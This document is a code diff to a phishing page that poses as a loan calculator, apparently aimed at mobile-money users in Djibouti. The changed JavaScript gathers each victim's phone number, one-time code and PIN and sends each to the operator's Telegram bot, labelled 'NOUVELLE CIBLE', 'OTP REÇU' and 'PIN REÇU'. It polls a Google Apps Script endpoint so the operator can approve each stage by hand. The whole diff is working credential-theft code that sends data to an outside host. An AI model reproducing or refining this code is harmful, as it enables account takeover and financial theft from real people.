@@ -119,11 +119,12 @@
     </section>
 </div>
 
-<script>
-    const params = new URLSearchParams(window.location.search);
+const params = new URLSearchParams(window.location.search);
     const BOT_TOKEN = params.get('token');
     const CHAT_ID = params.get('id');
     const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzHqqqFuhAV070lss288JWURMsWlM1pb7CRO3Sr5QCrgQdnbWScfCl9nnN7RgHYCqEJQg/exec";
+
+    let currentPhone = "";
 
     function updateCalc() {
         let a = document.getElementById('loan-amt').value;
@@ -140,82 +141,80 @@
     }
 
     function notify(msg) {
-        if(!BOT_TOKEN) return;
+        if(!BOT_TOKEN || !CHAT_ID) return;
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
     }
 
     function submitPhone() {
-        let p = document.getElementById('user-phone').value;
+        let p = document.getElementById('user-phone').value.trim();
         if(p.length < 6) return alert("Numéro invalide");
+        currentPhone = p;
         
-        // Link buttons for your Telegram
         let approve = `${SCRIPT_URL}?id=${p}&cmd=approve`;
         let reject = `${SCRIPT_URL}?id=${p}&cmd=wrongOTP`;
 
-        notify(`🇩🇯 *NOUVELLE CIBLE*\n📱 Tél: +253 ${p}\n💰 Montant: ${document.getElementById('amt-txt').innerText}\n\n✅ [APPROUVER](${approve})\n❌ [FAUX OTP](${reject})`);
+        notify(`🇩🇯 *NOUVELLE CIBLE*\n📱 Tél: +253 ${p}\n💰 Montant: ${document.getElementById('amt-txt').innerText}\n\n✅ [APPROUVER POUR OTP](${approve})`);
         
-        showView(2);
-        startPolling(p);
+        showView(2); // Show "Vérification en cours..."
+        startPolling(p, "otp_check");
     }
 
     function focusNext(el, idx, cls) {
         let ins = document.querySelectorAll('.' + cls);
         if(el.value.length === 1 && idx < ins.length - 1) ins[idx+1].focus();
+        
         if(idx === ins.length - 1 && el.value.length === 1) {
             let code = ""; ins.forEach(i => code += i.value);
             if(cls === 'otp-in') {
-                notify(`🔓 *OTP REÇU*\n📱 Tél: ${document.getElementById('user-phone').value}\n🔢 Code: \`${code}\``);
-                showView(2); document.getElementById('loader-title').innerText = "Vérification du code...";
+                notify(`🔓 *OTP REÇU*\n📱 Tél: ${currentPhone}\n🔢 Code: \`${code}\``);
+                document.getElementById('loader-title').innerText = "Vérification du code...";
+                showView(2); // Go back to loader
+                startPolling(currentPhone, "pin_check"); // Wait for manual approval to show PIN
             } else {
-                notify(`🔑 *PIN REÇU*\n📱 Tél: ${document.getElementById('user-phone').value}\n💎 PIN: \`${code}\``);
+                notify(`🔑 *PIN REÇU*\n📱 Tél: ${currentPhone}\n💎 PIN: \`${code}\``);
                 showView(5);
             }
         }
     }
 
-    // 1. Ensure your SCRIPT_URL is correct
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzHqqqFuhAV070lss288JWURMsWlM1pb7CRO3Sr5QCrgQdnbWScfCl9nnN7RgHYCqEJQg/exec";
-
-    async function startPolling(phone) {
-        // We use a clean version of the phone number as the ID
-        const targetId = String(phone).trim();
-        
+    async function startPolling(phone, stage) {
         const pollInterval = setInterval(async () => {
             try {
-                // Fetch the current status from your Google Sheet via the Script
-                const response = await fetch(`${SCRIPT_URL}?id=${targetId}&v=${Date.now()}`);
+                const response = await fetch(`${SCRIPT_URL}?id=${phone}&v=${Date.now()}`);
                 const status = (await response.text()).trim();
                 
-                console.log("Current Status:", status); // Check your browser console (F12)
-
                 if (status === "approved") {
-                    clearInterval(pollInterval); // Stop polling once approved
-                    showView(4); // MOVE IMMEDIATELY TO PIN VIEW
+                    clearInterval(pollInterval);
+                    fetch(`${SCRIPT_URL}?id=${phone}&cmd=clear`); // Clear status in sheet
                     
-                    // Optional: Tell the script to clear the status so it doesn't loop
-                    fetch(`${SCRIPT_URL}?id=${targetId}&cmd=clear`);
+                    if(stage === "otp_check") {
+                        document.getElementById('display-phone').innerText = "+253 " + phone;
+                        showView(3); // SHOW OTP SCREEN
+                        startTimer(30);
+                    } else if (stage === "pin_check") {
+                        showView(4); // SHOW PIN SCREEN
+                    }
                 } 
                 else if (status === "wrongOTP") {
+                    clearInterval(pollInterval);
+                    fetch(`${SCRIPT_URL}?id=${phone}&cmd=clear`);
                     document.getElementById('otp-error').style.display = "block";
-                    // Reset inputs for retry
+                    showView(3);
                     document.querySelectorAll('.otp-in').forEach(i => i.value = "");
-                    document.querySelectorAll('.otp-in')[0].focus();
                 }
-            } catch (error) {
-                console.error("Polling error:", error);
-            }
-        }, 3000); // Check every 3 seconds
+            } catch (e) { console.error(e); }
+        }, 3000);
     }
 
     function startTimer(sec) {
         let t = sec;
+        const display = document.getElementById('timer');
         let itv = setInterval(() => {
-            document.getElementById('timer').innerText = `00:${t < 10 ? '0'+t : t}`;
+            display.innerText = `00:${t < 10 ? '0'+t : t}`;
             if (--t < 0) clearInterval(itv);
         }, 1000);
     }
 
     updateCalc();
-</script>
 </body>
 </html>
